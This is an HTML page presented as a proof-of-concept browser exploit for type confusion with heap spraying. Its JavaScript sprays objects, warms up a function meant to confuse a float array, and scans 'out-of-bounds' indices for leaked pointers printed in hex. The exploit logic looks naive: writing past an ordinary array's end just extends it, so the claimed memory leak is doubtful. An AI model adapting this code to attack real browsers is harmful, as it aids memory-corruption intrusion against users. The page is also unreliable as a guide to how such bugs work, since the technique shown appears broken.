<!DOCTYPE html>
<html>
<head><title>PoC Type Confusion + Heap Spray</title></head>
<body>
  <h1>PoC Type Confusion + Heap Spray</h1>
  <pre id="log"></pre>
  <script>
    const log = (msg) => document.getElementById("log").textContent += msg + "\n";

    let float_arr;
    let oob;
    let objs = [];

    function hex(f) {
      let buf = new ArrayBuffer(8);
      let f64 = new Float64Array(buf);
      let u64 = new BigUint64Array(buf);
      f64[0] = f;
      return "0x" + u64[0].toString(16);
    }

    function setup() {
      // Preparar spray de objetos
      for (let i = 0; i < 10000; i++) {
        objs.push({a: 13.37, b: i});
      }

      float_arr = [1.1, 2.2, 3.3];

      function confuse(arr, index, val) {
        for (let i = 0; i < 10000; i++) {
          arr[0] = 1.1;
        }
        arr[index] = val;
        return arr;
      }

      oob = confuse(float_arr, 10, 13.37);
    }

    function scan() {
      log("=== Escaneo OOB ===");
      for (let i = 0; i < 100; i++) {
        try {
          let v = oob[i];
          if (typeof v === "number" && v !== 1.1 && v !== 2.2 && v !== 3.3 && v !== 13.37) {
            log(`oob[${i}] = ${v} → posible ptr: ${hex(v)}`);
          }
        } catch (e) {
          log(`oob[${i}] = [EXC]`);
        }
      }
    }

    setup();
    scan();
  </script>
</body>
</html>
